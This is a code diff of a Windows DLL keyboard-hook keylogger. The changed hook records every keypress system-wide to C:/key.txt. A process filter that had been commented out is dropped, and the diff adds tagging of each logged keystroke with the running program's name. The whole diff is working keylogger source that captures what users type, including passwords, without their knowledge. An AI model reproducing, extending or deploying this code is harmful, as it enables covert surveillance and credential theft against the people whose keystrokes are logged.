@@ -26,20 +26,23 @@ BOOL WINAPI DllMain(HINSTANCE hinstDLL,  // handle to the DLL module
 __declspec(dllexport) LRESULT WINAPI MyHook(int code, WPARAM wParam, LPARAM lParam){
     char strBuf[MAX_PATH] = {0};
     char *p = NULL;
+    // static char *old_p = NULL;
     if(code >= 0){
         if(!(lParam & 0x80000000)){
-            GetModuleFileName(NULL, (LPWSTR)strBuf, sizeof(strBuf));
+            GetModuleFileName(NULL, (LPTSTR)strBuf, sizeof(strBuf));
             p = strrchr(strBuf , '\\');
-            // if (!_stricmp("KeyLogTest.exe", p+1)){
-                fp = fopen("D:/key.txt", "a+");
-                if(GetKeyState (VK_SHIFT) > 0){ //shift键盘没按下
-                    if( wParam >= 'A' && wParam <= 'Z')
-                        wParam += 32;
-                }
-                fputc(wParam,fp);
-                fclose(fp);
-                return CallNextHookEx(g_hHook, code, wParam, lParam);
+            fp = fopen("C:/key.txt", "a+");
+            if(GetKeyState (VK_SHIFT) > 0){ //shift键盘没按下
+                if( wParam >= 'A' && wParam <= 'Z')
+                    wParam += 32;
+            }
+            // if(p != old_p){
+                fprintf(fp, "\n[%s]\n", p + 1);
             // }
+            fputc(wParam,fp);
+            fclose(fp);
+            // old_p = p;
+            return CallNextHookEx(g_hHook, code, wParam, lParam);
         }
     }
 
